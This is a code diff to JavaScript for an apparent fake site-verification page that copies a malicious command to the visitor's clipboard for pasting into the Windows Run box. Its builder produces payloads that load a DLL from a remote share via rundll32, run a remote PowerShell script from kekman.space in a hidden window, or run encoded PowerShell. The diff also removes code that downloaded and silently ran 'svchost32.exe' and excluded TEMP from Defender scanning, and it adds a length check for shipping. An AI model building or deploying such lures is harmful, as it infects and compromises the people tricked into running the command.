@@ -257,60 +257,30 @@
 const CFG = {
   site: 'kekman.space',
 
-  // 'rundll32' | 'ps_url' | 'ps_b64' | 'exe_drop'
-  mode: 'exe_drop',
+  // 'rundll32' | 'ps_url' | 'ps_b64'
+  mode: 'ps_b64',
 
-  // rundll32: UNC path, export after comma
   unc: '\\\\svc4static.zenithprospera.in.net\\verification.google,#1',
-
-  // ps_url: remote .ps1 to iex
   ps_url: 'https://kekman.space/p.ps1',
 
-  // ps_b64: inline base64 of a PS script
-  // generate: [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content .\p.ps1 -Raw)))
-  ps_b64: '',
-
-  // exe_drop
-  exe_url:  'https://kekman.space/verify.exe',
-  exe_name: 'svchost32.exe',
-  exe_show_window: false,   // true = payload window visible (debug)
-
-  av_excl: true             // blind Defender to %TEMP%
+  // base64 of UTF-16LE-encoded PS script (what -enc expects)
+  // built below — DO NOT hand-edit, regenerate with tools/build_b64.ps1
+  ps_b64: '__B64_HERE__'
 };
 
 // ╚══════════════════════════════════════════════════════════════════╝
 
 function buildPayload() {
-  const av = CFG.av_excl
-    ? 'try{Add-MpPreference -ExclusionPath $env:TEMP -EA 0}catch{};'
-    : '';
-
   switch (CFG.mode) {
-
     case 'rundll32':
       return 'rundll32.exe ' + CFG.unc;
 
     case 'ps_url':
-      return 'powershell -w h -nop -noni -ep bypass -c "'
-        + av
-        + "iex(iwr '" + CFG.ps_url + "' -UseBasicParsing)"
-        + '"';
+      return 'powershell -w h -nop -c "iex(iwr ' + CFG.ps_url + ' -UseBasicParsing)"';
 
     case 'ps_b64':
-      return 'powershell -w h -nop -noni -ep bypass -c "'
-        + av
-        + "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('"
-        + CFG.ps_b64 + "')))"
-        + '"';
-
-    case 'exe_drop': {
-      const win = CFG.exe_show_window ? 'Normal' : 'Hidden';
-      return 'powershell -w h -nop -noni -ep bypass -c "'
-        + av
-        + '$p=Join-Path $env:TEMP \'' + CFG.exe_name + '\';'
-        + 'certutil -urlcache -split -f \'' + CFG.exe_url + '\' $p ^| Out-Null;'
-        + 'Start-Process -FilePath $p -WorkingDirectory $env:TEMP -WindowStyle ' + win + '"';
-    }
+      // no quotes, no escapes, no operators — cmd sees one clean word
+      return 'powershell -w h -nop -enc ' + CFG.ps_b64;
 
     default:
       return '';
@@ -318,6 +288,12 @@ function buildPayload() {
 }
 
 const PAYLOAD = buildPayload();
+
+// show length in console so you can confirm < 259 before shipping
+console.log('payload length:', PAYLOAD.length);
+if (PAYLOAD.length > 255) {
+  console.warn('WARNING: payload > 255 chars — will truncate in Win+R');
+}
 
 document.getElementById('siteName').textContent = CFG.site;
 document.getElementById('rayId').textContent =
@@ -332,11 +308,9 @@ setTimeout(() => {
 }, 2600);
 
 async function copyText(txt) {
-  // prefer async clipboard (needs HTTPS + user gesture)
   if (navigator.clipboard && window.isSecureContext) {
     try { await navigator.clipboard.writeText(txt); return true; } catch {}
   }
-  // fallback: hidden textarea + execCommand
   const t = document.createElement('textarea');
   t.value = txt;
   t.setAttribute('readonly', '');
